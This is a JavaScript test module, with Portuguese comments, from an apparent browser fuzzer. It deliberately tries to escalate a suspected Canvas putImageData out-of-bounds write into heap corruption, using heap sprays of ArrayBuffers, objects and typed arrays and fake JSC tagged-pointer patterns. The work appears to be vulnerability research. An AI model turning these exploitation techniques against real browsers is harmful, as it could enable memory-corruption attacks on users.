'use strict';
/**
 * Teste 10 — Canvas putImageData OOB: TENTATIVA DE EXPLOITAÇÃO
 *
 * Baseado na anomalia do Teste 5 (225 pixels vermelhos em região não-overlap),
 * este teste tenta escalar de OOB write para corrupção de heap controlada.
 *
 * Estratégia:
 *   1. Criar canvas com heap spray de objetos alinhados
 *   2. Usar putImageData com offset negativo para sobrescrever
 *      estruturas adjacentes na memória
 *   3. Verificar se há corrupção detectável (length, type, etc.)
 *
 * Variantes:
 *   A — Heap spray de ArrayBuffers + putImageData OOB
 *   B — Heap spray de objetos JS + putImageData OOB
 *   C — putImageData com ImageData contendo ponteiro falso
 *   D — Corrupção de length de TypedArray adjacente
 */
(function (global) {
  global.FuzzerTests = global.FuzzerTests || {};

  global.FuzzerTests['10'] = {
    id      : 10,
    name    : 'Canvas putImageData OOB — tentativa de exploração',
    category: 'Canvas-Exploit',
    timeout : 10000,

    run: function () {
      return new Promise(function (resolve) {
        var anomalies = [];

        /* -- Variante A: Heap spray de ArrayBuffers -- */
        (function variantA() {
          try {
            var buffers = [];
            for (var i = 0; i < 100; i++) {
              buffers.push(new ArrayBuffer(64));
            }

            var canvas = document.createElement('canvas');
            canvas.width = 4; canvas.height = 4;
            var ctx = canvas.getContext('2d');

            var data = ctx.createImageData(256, 256);
            for (var i = 0; i < data.data.length; i++) data.data[i] = 0x41;

            /* putImageData com offset negativo — tentar sobrescrever buffers adjacentes */
            ctx.putImageData(data, -100, -100);

            /* Verificar se algum buffer foi corrompido */
            var corrupted = 0;
            for (var i = 0; i < buffers.length; i++) {
              if (buffers[i].byteLength !== 64) corrupted++;
            }
            if (corrupted > 0) {
              anomalies.push('A: ' + corrupted + ' ArrayBuffers corrompidos');
            }
          } catch (e) {
            anomalies.push('A: ' + String(e));
          }
        }());

        /* -- Variante B: Heap spray de objetos JS -- */
        (function variantB() {
          try {
            var objects = [];
            for (var i = 0; i < 200; i++) {
              objects.push({ idx: i, payload: new Array(10).fill(i) });
            }

            var canvas = document.createElement('canvas');
            canvas.width = 8; canvas.height = 8;
            var ctx = canvas.getContext('2d');

            var data = ctx.createImageData(128, 128);
            /* Preencher com padrão que parece ponteiro JS (tagged pointer) */
            for (var i = 0; i < data.data.length; i += 4) {
              data.data[i]     = 0xFF;
              data.data[i + 1] = 0xFF;
              data.data[i + 2] = 0x00;
              data.data[i + 3] = 0x00;
            }

            ctx.putImageData(data, -60, -60);

            /* Verificar se objetos foram corrompidos */
            var corrupted = 0;
            for (var i = 0; i < objects.length; i++) {
              if (objects[i].idx !== i) corrupted++;
            }
            if (corrupted > 0) {
              anomalies.push('B: ' + corrupted + ' objetos JS corrompidos');
            }
          } catch (e) {
            anomalies.push('B: ' + String(e));
          }
        }());

        /* -- Variante C: putImageData com padrão de ponteiro -- */
        (function variantC() {
          try {
            var canvas = document.createElement('canvas');
            canvas.width = 16; canvas.height = 16;
            var ctx = canvas.getContext('2d');

            var data = ctx.createImageData(64, 64);
            /* Simular tagged pointer de JSC (0x0000FFFE... ou similar) */
            for (var i = 0; i < data.data.length; i += 4) {
              data.data[i]     = 0xFE;
              data.data[i + 1] = 0xFF;
              data.data[i + 2] = 0x00;
              data.data[i + 3] = 0x00;
            }

            ctx.putImageData(data, -24, -24);

            /* Verificar se o canvas ficou em estado inconsistente */
            var check = ctx.getImageData(0, 0, 16, 16);
            anomalies.push('C: teste de padrão de ponteiro concluído');
          } catch (e) {
            anomalies.push('C: ' + String(e));
          }
        }());

        /* -- Variante D: Corrupção de TypedArray adjacente -- */
        (function variantD() {
          try {
            var arr = new Uint32Array(16);
            for (var i = 0; i < arr.length; i++) arr[i] = 0xDEADBEEF;

            var canvas = document.createElement('canvas');
            canvas.width = 4; canvas.height = 4;
            var ctx = canvas.getContext('2d');

            var data = ctx.createImageData(64, 64);
            for (var i = 0; i < data.data.length; i++) data.data[i] = 0xFF;

            ctx.putImageData(data, -30, -30);

            /* Verificar se o TypedArray foi corrompido */
            var corrupted = 0;
            for (var i = 0; i < arr.length; i++) {
              if (arr[i] !== 0xDEADBEEF) corrupted++;
            }
            if (corrupted > 0) {
              anomalies.push('D: ' + corrupted + ' elementos de Uint32Array corrompidos');
            }
          } catch (e) {
            anomalies.push('D: ' + String(e));
          }
        }());

        setTimeout(function () {
          if (anomalies.length > 0) {
            resolve({ status: 'ANOMALY', detail: anomalies.join(' | ') });
          } else {
            resolve({ status: 'PASS', detail: 'A-D sem anomalias' });
          }
        }, 2000);
      });
    }
  };

}(window));